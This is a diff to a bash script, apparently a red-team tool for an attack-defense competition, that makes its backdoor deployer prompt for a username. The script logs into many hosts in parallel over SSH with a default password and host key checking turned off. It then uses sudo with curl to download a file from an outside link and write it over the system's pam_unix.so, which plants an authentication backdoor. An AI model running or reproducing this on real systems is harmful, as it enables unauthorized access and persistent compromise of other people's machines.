@@ -4,7 +4,6 @@ IPs=()
 network_id="10.20"
 number_of_teams=10
 host_ids=(111 121 131)
-admin="root"
 default_password="Password1!"
 timeout_duration=2
 path_to_pam="/usr/lib/x86_64-linux-gnu/security"
@@ -12,10 +11,12 @@ backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q
 touch backdoored_IPs.txt
 
 send_backdoor() {
-    export default_password timeout_duration admin path_to_pam backdoor_link
+    read -p "Username: " username
+
+    export default_password timeout_duration username path_to_pam backdoor_link
     printf "%s\n" "${IPs[@]}" | xargs -P 20 -I {} bash -c '
         IP="{}"
-        sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
+        sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$username@$IP" "
             echo \"$default_password\" | sudo -S apt install curl -y
             echo \"$default_password\" | sudo -S curl -o \"$path_to_pam/pam_unix.so\" \"$backdoor_link\"
         "
